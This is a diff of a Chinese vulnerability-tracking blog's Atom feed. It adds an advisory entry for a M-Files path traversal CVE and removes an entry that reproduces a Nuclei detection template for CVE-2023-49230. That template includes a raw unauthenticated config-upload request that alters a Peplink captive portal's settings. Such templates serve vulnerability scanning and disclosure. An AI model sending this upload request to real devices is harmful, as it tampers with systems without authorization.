@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-17T01:03:54.465Z</updated>
+  <updated>2025-06-17T01:45:12.742Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>M-Files25 路径遍历漏洞</title>
+    <link href="http://example.com/2025/06/17/github_877272860/"/>
+    <id>http://example.com/2025/06/17/github_877272860/</id>
+    <published>2025-06-17T01:45:12.745Z</published>
+    <updated>2025-06-17T01:45:12.742Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> M-Files25 路径遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5964</li></ul><p><strong>漏洞类型：</strong> 目录遍历</p><p><strong>漏洞描述：</strong> M-Files25.6.14925.0版本中存在路径遍历漏洞，攻击者可以通过构造特殊的路径请求，访问或操作服务器上的文件系统，超出其应有权限的范围。</p><p><strong>产品厂商：</strong> M-Files</p><p><strong>产品名称：</strong> M-Files25</p><p><strong>影响版本：</strong> 25.6.14925.0</p><p><strong>来源：</strong> <a href="https://github.com/byteReaper77/CVE-2025-5964-">https://github.com/byteReaper77/CVE-2025-5964-</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>exploit.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; M-Files25 路径遍历漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
+    
+  </entry>
   
   <entry>
     <title>BERT 勒索软件利用武器化的 ELF 文件升级对 Linux 机器的攻击</title>
@@ -521,33 +548,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Peplink Captive Portal 未授权配置上传漏洞</title>
-    <link href="http://example.com/2025/06/16/github_1644031419/"/>
-    <id>http://example.com/2025/06/16/github_1644031419/</id>
-    <published>2025-06-16T16:00:19.273Z</published>
-    <updated>2025-06-16T16:00:19.269Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Peplink Captive Portal 未授权配置上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-49230</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Peplink Captive Portal存在未授权上传漏洞，攻击者可以通过&#x2F;guest&#x2F;portal_admin_upload.cgi未授权上传配置，效果可在&#x2F;guest&#x2F;preview.cgi?portal_id&#x3D;1中观察到。</p><p><strong>产品厂商：</strong> Peplink</p><p><strong>产品名称：</strong> Peplink Captive Portal</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12195">https://github.com/projectdiscovery/nuclei-templates/issues/12195</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Is-there-an-existing-template-for-this"><a href="#Is-there-an-existing-template-for-this" class="headerlink" title="Is there an existing template for this?"></a>Is there an existing template for this?</h4><ul><li><input checked="" disabled="" type="checkbox"> I have searched the existing templates.</li></ul><h4 id="Nuclei-Template"><a href="#Nuclei-Template" class="headerlink" title="Nuclei Template"></a>Nuclei Template</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">cve-2023-49230</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Peplink</span> <span class="hljs-string">Captive</span> <span class="hljs-string">Portal</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">Config</span> <span class="hljs-string">Upload</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">srilakivarma</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    Unauthenticated upload to /guest/portal_admin_upload.cgi with effect visible at /guest/preview.cgi?portal_id=1.</span><br><span class="hljs-string"></span>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2023-49230</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">cve,</span> <span class="hljs-string">peplink,</span> <span class="hljs-string">upload,</span> <span class="hljs-string">unauth</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-comment"># Step 1: Upload configuration</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /guest/portal_admin_upload.cgi HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Content-Type: multipart/form-data; boundary=---------------------------370611892836891531633729116268</span><br><span class="hljs-string"></span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;option&quot;</span><br><br>        <span class="hljs-string">edit_page</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;mode&quot;</span><br><br>        <span class="hljs-string">submit</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;portal_id&quot;</span><br><br>        <span class="hljs-number">1</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;data&quot;</span><br><br>        &#123;<span class="hljs-string">&quot;status&quot;</span><span class="hljs-string">:&quot;ok&quot;</span>,<span class="hljs-string">&quot;config&quot;</span><span class="hljs-string">:</span>&#123;<span class="hljs-string">&quot;login&quot;</span><span class="hljs-string">:</span>&#123;<span class="hljs-string">&quot;access_mode&quot;</span><span class="hljs-string">:&quot;open&quot;</span>,<span class="hljs-string">&quot;message&quot;</span><span class="hljs-string">:&quot;&quot;</span>,<span class="hljs-string">&quot;tnc_content&quot;</span><span class="hljs-string">:&quot;Terms</span> <span class="hljs-string">and</span> <span class="hljs-string">Conditions.&quot;</span>,<span class="hljs-string">&quot;tnc_title&quot;</span><span class="hljs-string">:&quot;Terms</span> <span class="hljs-string">and</span> <span class="hljs-string">Conditions&quot;</span>,<span class="hljs-string">&quot;tnc_link&quot;</span><span class="hljs-string">:&quot;terms&quot;</span>,<span class="hljs-string">&quot;tnc_prompt&quot;</span><span class="hljs-string">:&quot;I</span> <span class="hljs-string">agree</span> <span class="hljs-string">to</span> <span class="hljs-comment">#TNC_LINK#&quot;,&quot;back_login_button&quot;:&quot;Back to Login&quot;,&quot;agree_button&quot;:&quot;Injected&quot;,&quot;session_id1&quot;:&quot; &quot;,&quot;session_id2&quot;:&quot; &quot;&#125;,&quot;common&quot;:&#123;&quot;hide_quota&quot;:&quot;no&quot;,&quot;landing_url&quot;:&quot;&quot;,&quot;logo_url&quot;:&quot;logo.cgi?portal_id=1&amp;type=preview&quot;,&quot;logo_url_def&quot;:&quot;logo.cgi?default=1&quot;,&quot;uploaded_logo_size&quot;:0,&quot;footer&quot;:&quot;Powered by Peplink.&quot;,&quot;footer_default&quot;:&quot;Powered by Peplink.&quot;&#125;,&quot;success&quot;:&#123;&#125;,&quot;reach_quota&quot;:&#123;&#125;,&quot;quota&quot;:&#123;&quot;limit&quot;:&#123;&quot;data&quot;:0,&quot;session_timeout&quot;:1800&#125;&#125;&#125;&#125;</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;logo_action&quot;</span><br><br>        <span class="hljs-string">x</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;logo&quot;;</span> <span class="hljs-string">filename=&quot;&quot;</span><br>        <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/octet-stream</span><br><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268--</span><br><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&quot;status&quot;: &quot;save_success&quot;&#x27;</span><br>        <br></code></pre></td></tr></table></figure><h4 id="Relevant-dumped-responses"><a href="#Relevant-dumped-responses" class="headerlink" title="Relevant dumped responses"></a>Relevant dumped responses</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[cve-2023-49230:word-1] [http] [high] https://redact.com/guest/portal_admin_upload.cgi<br></code></pre></td></tr></table></figure><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p><a href="https://www.tenable.com/cve/CVE-2023-49230">https://www.tenable.com/cve/CVE-2023-49230</a><br><a href="https://www.synacktiv.com/sites/default/files/2023-12/synacktiv-peplink-multiple-vulnerabilities.pdf">https://www.synacktiv.com/sites/default/files/2023-12/synacktiv-peplink-multiple-vulnerabilities.pdf</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Peplink Captive Portal 未授权配置上传漏洞&lt;/p&gt;
-&lt;p</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     
   </entry>
   
